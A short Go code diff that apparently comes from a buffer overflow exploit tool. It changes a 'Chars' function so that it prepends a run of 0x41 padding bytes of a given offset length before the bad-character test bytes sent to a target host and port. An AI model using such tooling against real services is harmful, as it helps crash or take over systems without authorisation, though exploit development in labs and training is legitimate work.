@@ -8,8 +8,12 @@ import (
 // ...
 func Chars(host string, port int, offset int, exclude string, pref,
         suff string) {
+    // generate the overflow
+    pad := generateBytes(0x41, offset)
+
     // generate the byte array of characters to send to the target service
-    data := characters([]byte(exclude))
+    fmt.Println(" > Generating characters.")
+    data := append(pad, characters([]byte(exclude))...)
 
     // build payload 
     fmt.Println(" > Building payload.")
